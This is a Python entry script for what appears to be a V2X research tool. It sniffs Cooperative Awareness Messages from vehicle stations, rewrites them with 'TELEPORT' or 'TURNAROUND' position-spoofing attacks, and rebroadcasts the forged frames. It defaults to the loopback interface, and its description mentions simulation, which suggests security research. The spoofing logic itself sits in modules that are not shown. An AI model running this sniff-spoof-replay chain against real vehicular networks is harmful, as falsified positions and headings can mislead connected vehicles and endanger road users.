from workers.sniffer import CAMSniffer
from workers.spoofer import CAMSpoofer, ATTACK_TYPES
from workers.packet_launcher import CAMlauncher
import argparse

def run(interface : str, count : int, att_type : int):
    sniffer = CAMSniffer(interface, count)
    sniffer.start()
    selected_attack = ATTACK_TYPES(att_type)
    for mac, payload in sniffer.get_discovered_stations().items():
        print(f"Station with MAC {mac} has payload: {payload}")
        spoofer = CAMSpoofer(mac, payload, attack_type=selected_attack)
        spoofer.run()
        spoofed_payload = spoofer.get_modified_payload()
        
        # Launching packet
        launcher = CAMlauncher(
            payload=spoofed_payload,
            mac=mac,
            dst='ff:ff:ff:ff:ff:ff',  # Broadcast destination
            interface='lo'
        )
        
        # Show frame info
        info = launcher.get_frame_info()
        print("Packet Information:")
        for key, value in info.items():
            print(f"   {key}: {value}")
        launcher.launch(count=1)
        
        
def main():
    parser = argparse.ArgumentParser(
        description="Launch a cluster of V2X stations for GeoNetworking simulation"
    )
    parser.add_argument(
        "--interface",
        "-s",
        type=str,
        default="lo",
        help="Interface to sniff on (default: Loopback)"
    )
    parser.add_argument(
        "--count",
        "-n",
        type=int,
        default=1,
        help="Number of packets to sniff (default: 1)"
    )
    parser.add_argument(
        "--attack-type",
        "-a",
        type=int,
        default=ATTACK_TYPES.TELEPORT.value,
        help="ATTACK TYPES (TELEPORT - 1, TURNAROUND - 2) (default: 1)"
    )
    args = parser.parse_args()
    run(args.interface, args.count, args.attack_type)


if __name__ == '__main__':
    main()
    